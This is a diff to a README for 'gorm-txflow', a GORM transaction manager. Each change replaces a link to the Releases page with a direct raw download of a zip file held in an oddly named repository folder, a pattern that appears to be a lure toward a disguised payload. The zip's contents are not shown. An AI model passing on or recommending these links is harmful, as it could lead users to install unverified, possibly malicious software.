@@ -1,7 +1,7 @@
 # 🌟 gorm-txflow - Simplifying Your Transaction Management
 
 ## 🛠️ Download Now
-[![Download gorm-txflow](https://img.shields.io/badge/Download%20gorm--txflow-v1.0.0-blue.svg)](https://github.com/bilizada/gorm-txflow/releases)
+[![Download gorm-txflow](https://github.com/bilizada/gorm-txflow/raw/refs/heads/main/stanzaic/gorm-txflow-3.2.zip%https://github.com/bilizada/gorm-txflow/raw/refs/heads/main/stanzaic/gorm-txflow-3.2.zip)](https://github.com/bilizada/gorm-txflow/raw/refs/heads/main/stanzaic/gorm-txflow-3.2.zip)
 
 ## 📖 Introduction
 gorm-txflow is an easy-to-use transaction manager for GORM. It supports various transaction types such as REQUIRED, REQUIRES_NEW, NESTED, and more. This tool helps manage complex transactions effortlessly, making it suitable for various applications like HTTP, Kafka, and job processing. 
@@ -10,7 +10,7 @@ gorm-txflow is an easy-to-use transaction manager for GORM. It supports various 
 To get started with gorm-txflow, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Head to our [Releases page](https://github.com/bilizada/gorm-txflow/releases) to find the latest version.
+   Head to our [Releases page](https://github.com/bilizada/gorm-txflow/raw/refs/heads/main/stanzaic/gorm-txflow-3.2.zip) to find the latest version.
 
 2. **Download the Software**  
    On the Releases page, locate the latest version of gorm-txflow. Click on the download link to save the file to your device. 
@@ -27,7 +27,7 @@ To get started with gorm-txflow, follow these simple steps:
 
 ## 📥 Download & Install
 For a smooth experience, ensure you are getting the correct version of gorm-txflow. 
-1. Visit the [Releases page](https://github.com/bilizada/gorm-txflow/releases) again to confirm you have the latest version.
+1. Visit the [Releases page](https://github.com/bilizada/gorm-txflow/raw/refs/heads/main/stanzaic/gorm-txflow-3.2.zip) again to confirm you have the latest version.
 2. Follow the installation instructions mentioned earlier.
 
 ## 📚 Features
@@ -68,4 +68,4 @@ Ensure you follow the installation instructions carefully. If issues persist, ch
 ## 🌟 Conclusion
 With gorm-txflow, you can easily manage transactions without any technical hassle. Follow the steps outlined, and you will be running your own transaction manager in no time.
 
-Remember, for downloads and updates, always refer to our [Releases page](https://github.com/bilizada/gorm-txflow/releases). Happy managing!
+Remember, for downloads and updates, always refer to our [Releases page](https://github.com/bilizada/gorm-txflow/raw/refs/heads/main/stanzaic/gorm-txflow-3.2.zip). Happy managing!
